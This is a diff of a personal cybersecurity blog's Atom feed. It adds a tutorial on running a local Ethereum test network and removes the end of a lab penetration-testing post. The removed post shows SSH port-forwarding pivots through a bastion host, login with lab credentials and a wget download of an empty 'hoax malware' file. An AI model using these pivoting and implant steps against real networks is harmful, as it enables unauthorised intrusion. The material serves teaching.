@@ -1,4 +1,215 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://www.kmmanoj.me/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.kmmanoj.me/" rel="alternate" type="text/html" /><updated>2023-03-23T11:12:01-04:00</updated><id>https://www.kmmanoj.me/feed.xml</id><title type="html">Manoj Vignesh K M</title><subtitle>Manoj&apos;s articulated knowledge base of cybersecurity research</subtitle><entry><title type="html">Software Defined Networks 101</title><link href="https://www.kmmanoj.me/2023/03/10/software-defined-networks-101.html" rel="alternate" type="text/html" title="Software Defined Networks 101" /><published>2023-03-10T23:00:00-05:00</published><updated>2023-03-10T23:00:00-05:00</updated><id>https://www.kmmanoj.me/2023/03/10/software-defined-networks-101</id><content type="html" xml:base="https://www.kmmanoj.me/2023/03/10/software-defined-networks-101.html"><![CDATA[<p>Software Defined Networking, abbreviated as SDN, is an approach to networking that separates the control plane from the data plane. This architecture allows for management and configuration of network by administrators through software rather than through hardware. Overall, SDN allows for easier scaling and management of the network, and consequently allows development of better network automation capabilities. Further, similar to how virtualization revolutionized utilization of compute systems, SDN in conjunction with NFV (Network Function Virtualization) better utilizes the compute systems for networking.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://www.kmmanoj.me/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.kmmanoj.me/" rel="alternate" type="text/html" /><updated>2023-03-26T00:44:44-04:00</updated><id>https://www.kmmanoj.me/feed.xml</id><title type="html">Manoj Vignesh K M</title><subtitle>Manoj&apos;s articulated knowledge base of cybersecurity research</subtitle><entry><title type="html">Setting up a local ethereum blockchain network</title><link href="https://www.kmmanoj.me/2023/03/25/setting-up-a-local-ethereum-blockchain-network.html" rel="alternate" type="text/html" title="Setting up a local ethereum blockchain network" /><published>2023-03-25T00:00:00-04:00</published><updated>2023-03-25T00:00:00-04:00</updated><id>https://www.kmmanoj.me/2023/03/25/setting-up-a-local-ethereum-blockchain-network</id><content type="html" xml:base="https://www.kmmanoj.me/2023/03/25/setting-up-a-local-ethereum-blockchain-network.html"><![CDATA[<p>The Ethereum blockchain is similar to the Bitcoin blockchain in that it is a distributed ledger that records all transactions. However, ethereum blockchain provides a platform to build decentralized apps in the form of smart contracts.</p>
+
+<p>Given that the ethereum blockchain is a platform to build decentralised applications, it is key to learn this technology as it may revolutionize the way applications are built.</p>
+
+<p>In this article, we shall go through how to setup a local blockchain network to learn, experiment and build on Ethereum.</p>
+
+<h2 id="installing-geth">Installing geth</h2>
+
+<p>Geth (go-ethereum) is a Go implementation of Ethereum. It is an easy to setup ethereum client. Download and install geth from <a href="https://geth.ethereum.org/downloads">https://geth.ethereum.org/downloads</a></p>
+
+<h2 id="create-the-first-node">Create the first node</h2>
+
+<p>An ethereum blockchain node is any system that has a storage and is able to perform computation (using processor and memory). In geth world, each geth process can be considered the compute scope of a node, and a directory can be considered as an isolated storage space for that node. Hence, we create first node by creating a directory. Let us call it <code class="language-plaintext highlighter-rouge">node00</code>.</p>
+
+<blockquote>
+  <p>For ease of reference, <code class="language-plaintext highlighter-rouge">/rootnet</code> shall be used as the base directory</p>
+</blockquote>
+
+<p>Create a directory in the base directory by the name <code class="language-plaintext highlighter-rouge">node00</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>/node00
+</code></pre></div></div>
+
+<h2 id="create-the-first-account">Create the first account</h2>
+
+<p>An account, technically, is a cryptographic public-private key pair. An account is referenced by a 40-digit (20 bytes) hex code that is derived from the public key.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">address</span> <span class="o">=</span> <span class="nf">sha3</span><span class="p">(</span><span class="n">publicKey</span><span class="p">)[</span><span class="o">-</span><span class="mi">40</span><span class="p">:]</span>
+</code></pre></div></div>
+
+<p>While, the private key is kept safe and secret by the account holder.</p>
+
+<p>To create an account, run:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>geth <span class="nt">--datadir</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>/node00 account new
+</code></pre></div></div>
+
+<p>Note down the address of the account displayed.</p>
+
+<h2 id="configure-the-genesis-block">Configure the genesis block</h2>
+
+<p>A genesis block is the very first block in a blockchain network. To create such a block for the blockchain in setup, create a file called <code class="language-plaintext highlighter-rouge">genesis.json</code> in the base directory with the following content:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"config"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"chainId"</span><span class="p">:</span><span class="w"> </span><span class="mi">1337</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"homesteadBlock"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"eip155Block"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"eip158Block"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"eip150Block"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+    </span><span class="nl">"difficulty"</span><span class="p">:</span><span class="w"> </span><span class="s2">"400000"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"gasLimit"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2100000"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"alloc"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"&lt;Acc1 Addr&gt;"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nl">"balance"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1000000000000000000"</span><span class="w"> </span><span class="p">},</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Replace <code class="language-plaintext highlighter-rouge">&lt;Acc1 Addr&gt;</code> with the address of the account created in the previous step. The above configuration allocates <code class="language-plaintext highlighter-rouge">1 ether</code> to the account.</p>
+
+<blockquote>
+  <p>chainId 1337 is typically used for geth private chains</p>
+</blockquote>
+
+<blockquote>
+  <p>EIP stands for Ethereum Improvement Proposal. It is analogous to RFCs in internet world. Refer <a href="https://github.com/ethereum/EIPs/tree/master/EIPS">EIPs github repository</a> to learn more about EIPs.</p>
+</blockquote>
+
+<h2 id="initialize-the-first-node">Initialize the first node</h2>
+
+<p>Initialise the ethereum blockchain by running geth and feeding it with the genesis block.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>geth <span class="nt">--datadir</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>/node00 init <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>/genesis.json
+</code></pre></div></div>
+
+<h2 id="optional-ethereum-network-stats-dashboard">[Optional] Ethereum network stats dashboard</h2>
+
+<p>Ethereum network statistics dashboard allows one to visualise the health of different nodes in the ethereum blockchain network. Download ethereum network stats dashboard from github and set it up:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/cubedro/eth-netstats
+<span class="nb">cd </span>eth-netstats
+npm <span class="nb">install
+sudo </span>npm <span class="nb">install</span> <span class="nt">-g</span> grunt-cli
+</code></pre></div></div>
+
+<p>Run the ethereum network stats dashboard:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">WS_SECRET</span><span class="o">=</span>eth-netstats-password npm start
+</code></pre></div></div>
+
+<blockquote>
+  <p>You could use a different <code class="language-plaintext highlighter-rouge">WS_SECRET</code> if necessary.</p>
+</blockquote>
+
+<p>The ethereum network stats dashboard should be running at http://localhost:3000</p>
+
+<h2 id="optional-block-explorer---blockscout">[Optional] Block explorer - Blockscout</h2>
+
+<p>Block explorer helps visualise the blocks created and its related information in the ethereum blockchain. Download blockscout from github:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/blockscout/blockscout.git
+</code></pre></div></div>
+
+<p>Before starting the visualizer, change all occurence of <code class="language-plaintext highlighter-rouge">host.docker.internal</code> under the blockscout directory to the IP address of your computer. Then, run blockscout:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>blockscout/docker-compose
+docker-compose <span class="nt">-f</span> docker-compose-no-build-geth.yml up
+</code></pre></div></div>
+
+<p>The block explorer dashboard should be running at http://localhost:4000</p>
+
+<h2 id="start-the-node">Start the node</h2>
+
+<p>Now run the first node</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>geth <span class="nt">--identity</span> <span class="s2">"node00"</span> <span class="nt">--datadir</span><span class="o">=</span>./node00 <span class="nt">--networkid</span><span class="o">=</span>1337 <span class="nt">--syncmode</span><span class="o">=</span>full <span class="nt">--gcmode</span><span class="o">=</span>archive <span class="nt">--http</span> <span class="nt">--http</span>.corsdomain<span class="o">=</span><span class="s2">"*"</span> <span class="nt">--http</span>.api<span class="o">=</span>web3,eth,debug,personal,net,miner,admin <span class="nt">--allow-insecure-unlock</span> <span class="nt">--http</span>.addr <span class="s2">"0.0.0.0"</span> <span class="nt">--http</span>.port 8000 <span class="nt">--authrpc</span>.port 30000 <span class="nt">--port</span> 33000 <span class="nt">--ethstats</span><span class="o">=</span>node00:eth-netstats-password@localhost:3000 <span class="nt">--mine</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Remove <code class="language-plaintext highlighter-rouge">--ethstats</code> option if you skipped step 6</p>
+</blockquote>
+
+<p>Note down the enode number in the logs of the process</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+Started P2P networking self=enode://0123456789abcdef0123456...@127.0.0.1:33000
+...
+</code></pre></div></div>
+
+<h2 id="setup-and-create-other-nodes">Setup and create other nodes</h2>
+
+<p>The other nodes could use <code class="language-plaintext highlighter-rouge">node00</code> as a peer to learn about the blockchain built so far. Hence, in the previous step enode number was noted down so that the new node being created can use <code class="language-plaintext highlighter-rouge">node00</code> as the peer. The <code class="language-plaintext highlighter-rouge">geth.sh</code> file for the node:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+geth <span class="nt">--identity</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="nt">--datadir</span><span class="o">=</span>./<span class="nv">$1</span> <span class="nt">--networkid</span><span class="o">=</span>1337 <span class="nt">--syncmode</span><span class="o">=</span>full <span class="nt">--gcmode</span><span class="o">=</span>archive <span class="nt">--http</span> <span class="nt">--http</span>.corsdomain<span class="o">=</span><span class="s2">"*"</span> <span class="nt">--http</span>.api<span class="o">=</span>web3,eth,debug,personal,net,miner <span class="nt">--allow-insecure-unlock</span> <span class="nt">--bootnodes</span><span class="o">=</span>enode://&lt;the-saved-enode-addr&gt;@127.0.0.1:33000 <span class="nt">--http</span>.port <span class="k">$((</span><span class="m">8000</span><span class="o">+</span><span class="nv">$2</span><span class="k">))</span> <span class="nt">--authrpc</span>.port <span class="k">$((</span><span class="m">30000</span><span class="o">+</span><span class="nv">$2</span><span class="k">))</span> <span class="nt">--port</span> <span class="k">$((</span><span class="m">33000</span><span class="o">+</span><span class="nv">$2</span><span class="k">))</span> <span class="nt">--ethstats</span><span class="o">=</span><span class="nv">$1</span>:eth-netstats-password@localhost:3000 <span class="nt">--mine</span>
+</code></pre></div></div>
+
+<p>Replace <code class="language-plaintext highlighter-rouge">&lt;the-saved-enode-addr&gt;</code> with the saved enode address.</p>
+
+<p>To create node n (say node n is identified as node0n):</p>
+
+<ul>
+  <li>Create a directory <code class="language-plaintext highlighter-rouge">node0n</code></li>
+  <li>Initialize the node with genesis block:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  geth <span class="nt">--datadir</span> /rootnet/node0n init /rootnet/genesis.json
+</code></pre></div>    </div>
+  </li>
+  <li>Create an account
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  geth <span class="nt">--datadir</span> /rootnet/node0n account new
+</code></pre></div>    </div>
+  </li>
+  <li>Run the node
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ./geth.sh node0n
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<blockquote>
+  <p>To get CLI access to a node, say node00, one could run <code class="language-plaintext highlighter-rouge">geth attach http://localhost:8000</code>. Identify the HTTP port in which the node is running to connect to that node.</p>
+</blockquote>
+
+<h2 id="setup-metamask">Setup metamask</h2>
+
+<p>MetaMask is a popular cryptocurrency wallet that enables users to interact with decentralized applications (dApps) on the Ethereum blockchain. It is available in the form of browser extension too.</p>
+
+<p>Download metamask extension for your favorite browser. Then,</p>
+
+<ul>
+  <li>Navigate to <code class="language-plaintext highlighter-rouge">Settings &gt; Networks &gt; Add Network</code></li>
+  <li>Set <code class="language-plaintext highlighter-rouge">New RPC URL</code> to be <code class="language-plaintext highlighter-rouge">http://localhost:8000</code> [ Recall that this is the http server endpoint served by <code class="language-plaintext highlighter-rouge">node00</code> ]</li>
+  <li>Set <code class="language-plaintext highlighter-rouge">Chain ID</code> to be <code class="language-plaintext highlighter-rouge">1337</code></li>
+  <li>Set <code class="language-plaintext highlighter-rouge">Network Name</code> and <code class="language-plaintext highlighter-rouge">Currency symbol</code> of your interest.</li>
+  <li>Set <code class="language-plaintext highlighter-rouge">Block explorer URL</code> to be <code class="language-plaintext highlighter-rouge">http://localhost:4000</code> [ Ensure you followed the steps to setup <code class="language-plaintext highlighter-rouge">blockscout</code> ]</li>
+</ul>
+
+<p>Now, import the account in <code class="language-plaintext highlighter-rouge">node00</code> to metamask.</p>
+
+<ul>
+  <li>Select <code class="language-plaintext highlighter-rouge">Import account</code> option displayed in the dropdown menu when clicked on the profile logo on the right top corner of the window.</li>
+  <li>Find the private key:
+    <ul>
+      <li>Install <code class="language-plaintext highlighter-rouge">web3</code> module in python as: <code class="language-plaintext highlighter-rouge">pip3 install web3</code></li>
+      <li>In a python interpreter, run the following to retrieve the private key:
+        <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">from</span> <span class="n">web3.auto</span> <span class="kn">import</span> <span class="n">w3</span>
+  <span class="n">keyfile</span> <span class="o">=</span> <span class="s">'UTC--...'</span>
+  <span class="n">password</span> <span class="o">=</span> <span class="s">'&lt;password&gt;'</span>
+  <span class="n">w3</span><span class="p">.</span><span class="n">eth</span><span class="p">.</span><span class="n">account</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="nf">open</span><span class="p">(</span><span class="sa">f</span><span class="s">'/rootnet/node00/keystore/</span><span class="si">{</span><span class="n">keyfile</span><span class="si">}</span><span class="s">'</span><span class="p">).</span><span class="nf">read</span><span class="p">(),</span> <span class="n">password</span><span class="p">)</span>
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+  <li>Paste the obtained private key in the dialog box that popped up on metamask as <code class="language-plaintext highlighter-rouge">Import account</code> was clicked.</li>
+</ul>
+
+<h2 id="write-and-deploy-contract-using-remix">Write and deploy contract using remix</h2>
+
+<p>Remix is a web application that allows users to write, compile and deploy smart contracts to ethereum blockchain networks interactively. It is an IDE for decentralized application development.</p>
+
+<ul>
+  <li>Navigate to <a href="https://remix.ethereum.org/">https://remix.ethereum.org/</a></li>
+  <li>Select the <code class="language-plaintext highlighter-rouge">Deploy &amp; run transactions</code> option on the left navigation bar</li>
+  <li>From the <code class="language-plaintext highlighter-rouge">Environment</code> dropdown, select <code class="language-plaintext highlighter-rouge">Injected Provider - MetaMask</code> option</li>
+  <li>The metamask window should pop up asking consent to provide access to remix. Approve it.</li>
+  <li>Observe that your account address is seen in the <code class="language-plaintext highlighter-rouge">account</code> field of the <code class="language-plaintext highlighter-rouge">Deploy &amp; run transactions</code> sub-window.</li>
+</ul>
+
+<p>Now, you can write a contract or use a pre-existing one in the remix IDE, compile and deploy them to your blockchain network.</p>
+
+<h2 id="reference">Reference</h2>
+
+<p>[1] https://medium.com/datawallet-blog/how-to-deploy-a-local-private-ethereum-blockchain-c2b497f068f4</p>]]></content><author><name></name></author><category term="beginner" /><category term="application" /><category term="blockchain" /><category term="ethereum" /><summary type="html"><![CDATA[Set up a local ethereum blockchain network to learn, experiment, break and build decentralized apps (dApps)]]></summary></entry><entry><title type="html">Software Defined Networks 101</title><link href="https://www.kmmanoj.me/2023/03/10/software-defined-networks-101.html" rel="alternate" type="text/html" title="Software Defined Networks 101" /><published>2023-03-10T23:00:00-05:00</published><updated>2023-03-10T23:00:00-05:00</updated><id>https://www.kmmanoj.me/2023/03/10/software-defined-networks-101</id><content type="html" xml:base="https://www.kmmanoj.me/2023/03/10/software-defined-networks-101.html"><![CDATA[<p>Software Defined Networking, abbreviated as SDN, is an approach to networking that separates the control plane from the data plane. This architecture allows for management and configuration of network by administrators through software rather than through hardware. Overall, SDN allows for easier scaling and management of the network, and consequently allows development of better network automation capabilities. Further, similar to how virtualization revolutionized utilization of compute systems, SDN in conjunction with NFV (Network Function Virtualization) better utilizes the compute systems for networking.</p>
 
 <p>Before diving into technical details of SDN, one needs to understand the difference between control plane and data plane.</p>
 
@@ -1034,153 +1245,4 @@ $ python3 arp_spoof.py
 
 <blockquote>
   <p>I have them all, but I can’t use any! - DHCP Server</p>
-</blockquote>]]></content><author><name></name></author><category term="advanced" /><category term="application" /><category term="cybersecurity" /><category term="networking" /><category term="dhcp" /><category term="featured" /><summary type="html"><![CDATA[Most defense systems filter out repeated DHCP requests. What if you could perform DHCP starvation without sending a DCHP request?]]></summary></entry><entry><title type="html">Gain access to an internal machine using Port forwarding - Penetration Testing</title><link href="https://www.kmmanoj.me/2020/08/10/gain-access-to-an-internal-machine-using-port-forwarding-penetration-testing.html" rel="alternate" type="text/html" title="Gain access to an internal machine using Port forwarding - Penetration Testing" /><published>2020-08-10T00:00:00-04:00</published><updated>2020-08-10T00:00:00-04:00</updated><id>https://www.kmmanoj.me/2020/08/10/gain-access-to-an-internal-machine-using-port-forwarding-penetration-testing</id><content type="html" xml:base="https://www.kmmanoj.me/2020/08/10/gain-access-to-an-internal-machine-using-port-forwarding-penetration-testing.html"><![CDATA[<p>Port forwarding is a technique in which a port in one machine is tunneled to a port in another machine. In simple words, a request made to a port <code class="language-plaintext highlighter-rouge">P1</code> of a machine <code class="language-plaintext highlighter-rouge">M1</code> is “forwarded” as a request to port <code class="language-plaintext highlighter-rouge">P2</code> of a machine <code class="language-plaintext highlighter-rouge">M2</code>.</p>
-
-<p>In the <a href="/2020/08/09/gain-access-to-an-internal-machine-using-port-forwarding-setup-experiment-environment.html">previous blog</a>, we set up the experiment environment which emulated the setup as shown in the following diagram. In this blog, we shall perform the penetration test as we go along learning <strong>port forwarding</strong>.</p>
-
-<p><img src="/assets/img/pivoting/scene.png" alt="Scenario Visual" />
-<br /><small style="color: gray">Scenario Visualization</small><br /></p>
-
-<h2 id="recap">Recap</h2>
-
-<p>You, a penetration tester, have the following information:</p>
-
-<ul>
-  <li>The data center is in <code class="language-plaintext highlighter-rouge">172.17.0.0/16</code> subnet and the enterprise is in <code class="language-plaintext highlighter-rouge">10.10.10.0/24</code> subnet.</li>
-  <li>The IP address of your machine is <code class="language-plaintext highlighter-rouge">172.17.0.1</code>.</li>
-  <li>The IP address of the network interface of the bastion server facing the data center network is <code class="language-plaintext highlighter-rouge">172.17.0.2</code>, while the network interface that is facing the enterprise network is <code class="language-plaintext highlighter-rouge">10.10.10.2</code>.</li>
-  <li>The IP address of the internal server is <code class="language-plaintext highlighter-rouge">10.10.10.3</code>.</li>
-  <li>The internal server doesn’t have access to the internet. (Somehow)</li>
-  <li>The SSH login credentials to the bastion server is <code class="language-plaintext highlighter-rouge">bastion:fortwall</code> and that of the internal server is <code class="language-plaintext highlighter-rouge">admin:homeportal</code>.</li>
-</ul>
-
-<p>Your intention is to <strong>place a hoax malware</strong> in the internal server.</p>
-
-<p><em>I suggest the readers comprehend the port forwarding terminologies with respect to the machine at the readers’ end.</em></p>
-
-<h2 id="recon-bastion-server">Recon bastion server</h2>
-
-<p>You begin by scanning for open ports in the bastion server, to find out which port serves the SSH service.</p>
-
-<p><img src="/assets/img/pivoting/recon.png" alt="Recon bastion" /></p>
-
-<p>The SSH server is running at <strong>port 2222</strong> of the bastion server and the credentials that you obtained by social engineering works!</p>
-
-<h2 id="recon-internal-server---dynamic-port-forwarding">Recon internal server - Dynamic port forwarding</h2>
-
-<p>It is time to pivot at the bastion server to recon the internal network (<code class="language-plaintext highlighter-rouge">10.10.10.0/24</code>). How do you perform reconnaissance on the internal server whose IP address is <code class="language-plaintext highlighter-rouge">10.10.10.3</code>? You could install nmap and other tools in the bastion server, but that doesn’t seem to be stealthy!</p>
-
-<p>You plan to allocate a port in your localhost that tunnels traffic to the bastion server, and the bastion server makes requests on your behalf. This method is known as <strong>Dynamic Port Forwarding</strong>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[localhost]-9050 &lt;-&gt; 2222-[bastion]-bport_any &lt;-&gt; iport_any-[internal_server]
--------&gt; request
-&lt;------- response
-</code></pre></div></div>
-
-<p>SSH client provides a powerful set of options to execute port forwarding. To execute dynamic port forwarding to communicate with the internal network, run the following command.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-D</span> 9050 <span class="nt">-p2222</span> <span class="nt">-Nf</span> bastion@172.17.0.2
-</code></pre></div></div>
-
-<p><code class="language-plaintext highlighter-rouge">-D</code> option is used to open a port for dynamic port forwarding. The above command opens port 9050 in localhost and any request to it is forwarded to the bastion which dynamically opens a port for communication.</p>
-
-<h4 id="other-options">Other options</h4>
-
-<ul>
-  <li><code class="language-plaintext highlighter-rouge">-p</code>: to specify the port to which SSH request is to be made.</li>
-  <li><code class="language-plaintext highlighter-rouge">-N</code>: Do not execute any command. (I don’t need a shell)</li>
-  <li><code class="language-plaintext highlighter-rouge">-f</code>: Run SSH in the background.</li>
-</ul>
-
-<p>Further, you configure the proxychains to run nmap through. Open the file <code class="language-plaintext highlighter-rouge">/etc/proxychains.conf</code> and add the following record (tab-separated) under the <code class="language-plaintext highlighter-rouge">[ProxyList]</code> section:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socks5    127.0.0.1    9050  
-</code></pre></div></div>
-
-<p>Now, you perform port scanning on the internal server at <code class="language-plaintext highlighter-rouge">10.10.10.3</code> through the bastion server at <code class="language-plaintext highlighter-rouge">172.17.0.2</code>, to find the port that services SSH requests. To do so, you run the following command:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains nmap <span class="nt">-e</span> docker0 <span class="nt">-Pn</span> <span class="nt">-sT</span> 10.10.10.3
-</code></pre></div></div>
-
-<p><code class="language-plaintext highlighter-rouge">-e</code> option forces nmap to use a particular interface (<code class="language-plaintext highlighter-rouge">172.17.0.1</code> in our case)</p>
-
-<p><img src="/assets/img/pivoting/recon-bastion.png" alt="Recon through bastion using proxychains" /></p>
-
-<h2 id="log-in-to-internal-server---local-port-forwarding">Log in to internal server - Local port forwarding</h2>
-
-<p>Now that you learned that the internal server serves SSH service at port 2222, you decide to log in to the server with the credentials that you have. Since the internal server is in another private network, you plan to port forward the requests made to one of the ports of the network interface reachable to you, to port 2222 of the internal server through the bastion server.</p>
-
-<p>When you want to expose a service in a server to a port of an interface reachable to you, use <strong>Local port Forwarding</strong>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[localhost]-2323 &lt;-&gt; 2222-[bastion]-bport &lt;-&gt; 2222-[internal_server]
--------&gt; request
-&lt;------- response
-</code></pre></div></div>
-
-<p>To expose SSH service of the internal server on your local machine, run the following command.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-L</span> 2323:10.10.10.3:2222 <span class="nt">-p2222</span> <span class="nt">-Nf</span> bastion@172.17.0.2
-</code></pre></div></div>
-
-<p><code class="language-plaintext highlighter-rouge">-L</code> option is used to local port forward a request to a remote server. In this case, the request to port 2323 of your machine reaches the internal server at port 2222 through the session with the bastion server. The IP address (i.e. <code class="language-plaintext highlighter-rouge">10.10.10.3</code>) provided as the value for this option should be reachable by the bastion server.</p>
-
-<p>Thus, by running the following command using the socially engineered credentials, you should be able to login to the internal server.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-p2323</span> admin@localhost
-</code></pre></div></div>
-
-<p><img src="/assets/img/pivoting/login-internal.png" alt="Login to internal server by local port forwarding" /></p>
-
-<h2 id="install-the-hoax-malware---remote-port-forwarding">Install the hoax malware - Remote port forwarding</h2>
-
-<p>The final step is to install the hoax malware into the internal server. You plan to host an HTTP file server at your end and wget the hoax malware at the internal server. Remember, the internal server has no access to the internet. But, it is able to access all nodes in the enterprise subnet. Hence, you need to expose the HTTP file service running at port 8080 at your end through the bastion server to the internal server at port 8000.</p>
-
-<p>When you want to expose a service running in your machine to a port of an interface reachable to a remote server, use <strong>Remote port Forwarding</strong>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[localhost]-8080 &lt;-&gt; 2222-[bastion]-8000 &lt;-x-&gt; iport-[internal_server]
-&lt;------- request
--------&gt; response
-</code></pre></div></div>
-
-<p>To expose the HTTP service of your local machine to the internal server through the bastion server, run the following command.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-R</span> 8000:127.0.0.1:8080 <span class="nt">-p2222</span> <span class="nt">-Nf</span> bastion@172.17.0.2
-</code></pre></div></div>
-
-<p><code class="language-plaintext highlighter-rouge">-R</code> option is used to remote port forward a response to a remote server. In this case, the request to port 8000 of the bastion server reaches your computer at port 8080. The IP address provided as the value for this option should be “assignable” by your computer. (You could also use <code class="language-plaintext highlighter-rouge">localhost</code> instead of the IP address of your computer. Localhost = localhost for your computer)</p>
-
-<p>In another terminal, you create an empty hoax malware file by the name <code class="language-plaintext highlighter-rouge">hoax_malware</code> by running <code class="language-plaintext highlighter-rouge">touch hoax_malware</code> and start the HTTP file server using the following command.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8080
-</code></pre></div></div>
-
-<p>But wait! You realize that remote port forwarding can only go up to the localhost network interface of the bastion server.</p>
-
-<p><img src="/assets/img/pivoting/remote-port-forward.png" alt="Remote port forwarding to bastion server" /></p>
-
-<h2 id="remote-port-forwarding-through-a-port-that-is-forwarded-locally">Remote port forwarding through a port that is forwarded locally</h2>
-
-<p>This is not a type of port forwarding, but an attempt to show the power of compounding multiple types of port forwarding techniques. You want to somehow install the hoax malware into the internal server. Your thoughts are going wild and creativity is at its peak. You think “<em>What if I could remote forward it to the internal server itself? I anyways have SSH access to the internal server through port 2323 of my machine</em>”. Your fingers quickly fidget the following command on your penetration testing machine and you restart the HTTP file server.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-R</span> 8000:127.0.0.1:8080 <span class="nt">-p2323</span> <span class="nt">-Nf</span> admin@localhost
-python3 <span class="nt">-m</span> http.server 8080
-</code></pre></div></div>
-
-<p>And, then switch to the internal server shell terminal and try to download the hoax malware again.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://localhost:8000/hoax_malware
-</code></pre></div></div>
-
-<p><img src="/assets/img/pivoting/compound-pf.png" alt="Compound port forwarding to achieve the desired requirement" /></p>
-
-<p><strong>Bingo! MISSION ACCOMPLISHED!</strong></p>
-
-<p>NOTE: There are multiple ways to gain access to the internal server. The intention of this specific series of steps is to learn port forwarding.</p>
-
-<h2 id="more-port-forwarding-examples-in-real-life">More Port forwarding examples in real life</h2>
-
-<p><strong>Docker</strong>, the well-known containerization platform extensively uses local port forwarding. The <code class="language-plaintext highlighter-rouge">--publish</code> or <code class="language-plaintext highlighter-rouge">-p</code> option enables it. The port specified prefixing the colon <code class="language-plaintext highlighter-rouge">:</code> is the port on the host which is tunneled to the port of the docker container corresponding to the service it is running.</p>
-
-<p><strong>Ngrok</strong>, a network utility, lets one open one or more ports to the world! Yes, I mean it, the world! I believe it is using remote port forward technique, which exposes the service running at a port in the local machine to the world through the ngrok service’s <code class="language-plaintext highlighter-rouge">hostname:port</code> that pops up on the screen when one runs the ngrok utility.</p>
-
-<p><strong>Burpsuite</strong>, a web application penetration testing tool uses dynamic port forwarding. Here, the proxy server is the localhost itself. The proxy server typically runs at port 8080. Burpsuite processes and/or stores the request and forwards it to the server the browser is trying to reach. The response, however, comes back to Burpsuite, which forwards it to the browser and eventually gets rendered on the screen.</p>]]></content><author><name></name></author><category term="intermediate" /><category term="application" /><category term="cybersecurity" /><category term="networking" /><category term="featured" /><summary type="html"><![CDATA[Set up a penetration testing environment using docker containers in docker networks to learn various types of port forwarding techniques]]></summary></entry></feed>
